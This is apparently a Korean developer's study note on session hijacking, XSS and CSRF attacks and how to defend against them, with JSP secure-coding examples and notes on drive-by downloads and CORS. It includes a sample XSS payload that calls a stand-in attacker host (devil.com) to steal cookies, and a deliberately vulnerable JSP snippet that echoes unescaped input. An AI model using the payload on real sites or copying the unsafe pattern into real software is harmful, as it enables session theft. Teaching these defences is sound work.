# XSS와 CSRF 공격을 막으려면 어떻게 해야할까

## 웹 서버에서 세션 유지와 보안

```
💡휴대폰에서 네이버에 로그인 후 전원을 껐다 다시 켜도 로그인 상태가 유지되는 상황

- 디바이스를 껐다 켰음에도 연결(세션)은 끊기지 않고 로그인 정보가 유지됨
```

### 세션 유지의 원리

- WAS는 사용자의 로그인 여부를 판단할 때 SID값을 확인하여 세션을 복구한다.
1. 사용자가 로그인하면 쿠키 형태로 SID(세션 ID)를 할당받고, SID는 File의 형태로 저장된다.
2. 사용자가 디바이스 전원을 껐다 켜고 접속하면, File을 다시 읽어와 SID를 그대로 복구해놓는다. ID, PW를 묻지 않고도 로그인 상태를 유지한다.

### 보안 위험

해커가 SID에 해당하는 쿠키값을 탈취하면 ID, PW 없이 로그인이 가능하다.

⇒ **세션 탈취(Session Hijacking)**

: 인증이 완료된 사용자의 브라우저에서 인증 정보가 담긴 세션 쿠키를 탈취하여
별도의 로그인 없이 해당 쿠키를 통해 서버와 통신하는 것

## XSS, CSRF 공격

### XSS (크로스 사이트 스크립트)

해커가 웹 페이지에 악의적인 스크립트를 포함시켜 의도하지 않은 명령을 실행시키거나 세션 등을 탈취하는 공격

**[XSS 공격 과정]**

![image](https://github.com/user-attachments/assets/740a58ab-e7ef-44af-8ae8-87b352dfac94)


1. 해커가 JavaScript 코드가 포함된 게시물을 웹 서버에 업로드하여 공격
2. 사용자가 해당 게시글을 읽으면, 브라우저가 게시물 내 JavaScript 코드를 실행
3. JavaScript 코드가 사용자의 쿠키값을 읽어 해커에게 전송
4. 해커는 사용자의 쿠키값을 이용하여 ID, PW 없이 로그인된 상태로 위장하여 접근 가능

### CSRF (크로스 사이트 요청 변조)

특정 웹 사이트에 대해서 인증된 사용자가 인지하지 못한 상황에서 공격자가 의도한 행위(수정, 삭제, 등록 등)를 요청하게 하는 공격

- 공격자는 사용자가 인증한 세션이 특정 동작을 수행하여도 계속 유지되어 정상적인 요청과 비정상적인 요청을 구분하지 못하는 점을 악용
- 해당 사용자가 관리자인 경우 사용자 권한 관리, 게시물 삭제, 사용자 등록 등 관리자의 권한으로만 수행 가능한 기능을 공격자의 의도대로 실행시킬 수 있게 됨
- 웹 서버에 요청을 전달할 때, 요청의 적법성을 입증하기 위하여 전달되는 값이 고정되어있고, 이 자료가 GET방식으로 전달된다면 공격자가 이를 쉽게 알아내어 원하는 요청을 보냄으로써 위험한 작업을 요청할 수 있게 됨

**[CSRF 공격 과정]**

![image](https://github.com/user-attachments/assets/58f2f3bb-6e71-41a6-aae6-b9e7cd1bd826)

1. 사용자가 웹사이트에 로그인하여 정상적인 쿠키를 발급받음
2. 해커가 CSRF 공격 코드를 포함한 페이지를 특정 웹사이트에 등록
3. 사용자가 CSRF 스크립트가 포함된 페이지에 접근하면 CSRF 스크립트가 실행
4. CSRF 스크립트가 자동으로 공격 대상 웹사이트에 사용자의 세션 쿠키를 포함한 악성 요청을 전송
5. 웹 서버가 사용자의 권한을 이용해 요청을 수행

### XSS 와 CSRF의 차이점

| 공격 유형 | 특징 | 목적 |
| --- | --- | --- |
| XSS | 사용자의 브라우저에서 악성 JavaScript 실행 | 쿠키, 세션 정보 탈취 |
| CSRF | 사용자의 권한을 악용하여 서버에 요청 | 비밀번호 변경, 계좌 이체 등 악의적 요청 수행 |
- XSS를 이용한 공격이 사용자가 특정 웹사이트를 신용하는 점을 노린 것이라면, CSRF는 특정 웹사이트가 사용자의 웹 브라우저를 신용하는 상태를 노린 것이다.

## XSS와 CSRF의 방어

1. 입력을 모두 신뢰하지 않기
    - 모든 입력값(게시물, 첨부파일 등)을 신뢰하지 않고 검증해야함
2. 시큐어 코딩(Secure Coding) 적용
    - 입력을 검증하고 코드 수준에서 보안 대응을 적용하는 것
3. CC 인증을 획득한 도구 활용
    - 소프트웨어 보안 약점 진단원
    - 정적 분석 도구
    - 웹 취약점 스캐너
    - 모의해킹

### XSS 시큐어 코딩 - 안전한 코딩 기법

1. 일반적인 경우에는 사용자가 문자열에 스크립트를 삽입하여 실행하는 것을 막기 위해 사용자가 입력한 문자열에서 <, >, &r, “,” 등을 replace 등 문자 변환 함수나 메서드를 사용하여 &lt, &gt, &amp, &quot로 치환
    - 안전하지 않은 코드 예시
        
        ```html
        <%@page contentType="text/html" pageEncoding="UTF-8"%>
        <html>
        <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        </head>
        <body>
        	<h1>XSS Sample</h1>
        	<%
        	<!-- 외부로 부터 이름을 받음 -->
        	String name = request.getParameter("name");
        	 %>
        	<!-- 외부로부터 받은 name이 그대로 출력-->
        	<p>NAME:<%=name%></p>
        </body>
        </html>
        ```
        
        - 외부 입력을 name값으로 특별한 처리과정없이 결과 페이지 생성에 사용
        - 악의적인 공격자가 name값에 `<script>url = "http://devil.com/attack.jsp;</script>` 를 넣으면 사용자의 권한으로 attack.jsp 코드가 수행되어 사용자의 쿠키 정보 유출 등 피해가 발생
    - 안전한 코드 예시
        
        ```html
        <%@page contentType="text/html" pageEncoding="UTF-8"%>
        <html>
        <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        </head>
        <body>
        	<h1>XSS Sample</h1>
        	<%
        	<!-- 외부로부터 이름을 받음-->
        	 String name = request.getParameter("name");
        	
        	<!-- 외부의 입력값에 대한 검증 -->
        	if ( name != null ) {
        		name = name.replaceAll("<","&lt;");
        		name = name.replaceAll(">","&gt;");
        		name = name.replaceAll("&","&amp;");
        		name = name.replaceAll("\"","&quot;");
        	}
        	else {
        		return;
        	}
        	%>
        	<!-- 외부로부터 받은 name에서 위험문자를 제거한 후 출력 -->
        	<p>NAME:<%=name%></p>
        </body>
        </html>
        ```
        
        - 외부 입력 문자열에서 replaceAll() 메서드를 사용하여 <,> 같이 HTML에서 스크립트 생성에 사용되는 모든 문자열을 &lt, &gt, &amp, &quot 과 같은 형태로 변경하여 악의적인 스크립트 실행의 위험성을 줄임
2. HTML 태그를 허용하는 게시판에서는 게시판에서 지원하는 HTML 태그의 리스트를 선정한 후 해당 태그만 허용하는 방식을 적용
3. 보안성이 검증되어있는 API를 사용하여 위험한 문자열을 제거

### CSRF 시큐어 코딩 - 안전한 코딩 기법

1. 입력화면 폼 작성 시 GET 방식보다는 POST 방식을 사용
    
    ```html
    <!-- <form name="MyForm" method="get" action="customer.do"> -->
    <form name="MyForm" method="post" action="customer.do">
    	<input type=text name="txt1">
    	<input type=submit value="보내기">
    </form>
    ```
    
    - GET 방식은 단순히 폼 데이터를 URL 뒤에 덧붙여서 전송하므로 GET 방식의 폼을 사용하면 전달 값이 노출됨.
2. 입력화면 폼과 해당 입력을 처리하는 프로그램 사이에서 토큰을 사용하여 공격자의 직접적인 URL 사용이 동작하지 않도록 처리
    - 중요한 기능에 대해서는 사용자 세션 검증과 재인증을 유도하는 것이 좋음

## 추가 보안 개념
### Drive by download 공격

- 특정 웹사이트에 접속하는 것만으로 악성코드가 자동으로 다운로드 및 실행되는 공격 방식
- 사용자가 특정 웹사이트에 접속하였을 때(이메일 메세지에 포함된 사이트 주소를 클릭하는 경우 포함) 사용자도 모르게 악성 SW가 사용자의 디바이스에 다운로되도록 하는 해킹기법
- 접근 방식
    - 자신이 직접 웹사이트를 준비해 놓고, 목표로 하는 사용자가 이 사이트에 접속을 하도록 유도하는 방식
    - 사용자들이 자주 방문하는 유명한 웹사이트에 악성코드(Script)를 심어 놓는 것
### CORS (Cross-Origin Resource Sharing)

- **CORS** : 도메인이 다른 서버끼리 리소스를 주고 받을 때 보안을 위해 설정된 정책으로, 특정 출처(Origin)에서 요청을 허용할 수 있도록 함
    - 웹 브라우저에서 실행되는 JavaScript가 다른 도메인(origin)의 리소스를 요청할 때 SOP 정책에 의해 차단되는 문제를 해결하는 기술
- **SOP(Same-Origin Policy)** : 같은 출처(Origin)에서만 리소스를 공유할 수 있도록 제한하는 보안 정책
    - 출처(Origin) = 프로토콜 + 도메인 + 포트 (ex. `https://example.com:443`)
- CORS가 생겨난 배경
    - XSS, CSRF와 같은 공격을 원천적으로 차단하기 위해 브라우저 수준에서 보안 정책을 적용
    - SOP 정책은 보안을 강화하지만, 개발 과정에서 **다른 출처와의 상호작용이 필요한 경우 불편함**이 발생. 이를 해결하기 위해 특정 조건에서 다른 출처의 요청을 허용하는 CORS 정책이 등장

⇒ CORS는 SOP의 보안 원칙을 유지하면서도, 필요한 경우 출처가 다른 리소스를 안전하게 요청할 수 있도록 허용하는 정책

---

### 참고자료

[https://ttl-blog.tistory.com/1305#🤔 세션 하이재킹 (Session hijacking)-1](https://ttl-blog.tistory.com/1305#%F0%9F%A4%94%20%EC%84%B8%EC%85%98%20%ED%95%98%EC%9D%B4%EC%9E%AC%ED%82%B9%20(Session%20hijacking)-1)

Java 시큐어코딩 가이드

https://m.blog.naver.com/PostView.nhn?blogId=aepkoreanet&logNo=221259502447&proxyReferer=https:%2F%2Fwww.google.co.kr%2F

[https://velog.io/@effirin/CORS란-무엇인가](https://velog.io/@effirin/CORS%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80)
